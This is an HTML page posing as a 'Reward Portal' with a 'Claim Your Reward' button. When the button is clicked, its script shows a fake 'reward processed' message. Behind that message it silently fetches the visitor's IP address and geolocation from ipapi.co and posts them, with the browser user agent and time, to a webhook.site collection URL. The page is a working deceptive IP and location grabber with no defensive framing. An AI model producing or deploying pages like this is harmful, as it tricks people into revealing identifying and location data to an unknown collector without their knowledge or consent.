<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Reward Portal</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #f4f4f4;
      text-align: center;
      padding-top: 100px;
    }

    .box {
      background: white;
      display: inline-block;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    button {
      padding: 12px 25px;
      border: none;
      border-radius: 5px;
      background: #007bff;
      color: white;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }

    button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>
  <div class="box" id="mainBox">
    <h2>Claim Your Reward</h2>
    <p>Click the button below to claim.</p>
    <button onclick="handleClaim()">Claim</button>
  </div>

  <script>
    async function handleClaim() {
      document.getElementById("mainBox").innerHTML = "<h2>Thank you!</h2><p>Your reward has been processed.</p>";

      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        const payload = {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          org: data.org,
          ua: navigator.userAgent,
          time: new Date().toString()
        };

        await fetch('https://webhook.site/822f6a91-0138-4dfd-9ace-45c36ba901a3', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

      } catch (e) {
        console.error("Error sending data:", e);
      }
    }
  </script>
</body>
</html>
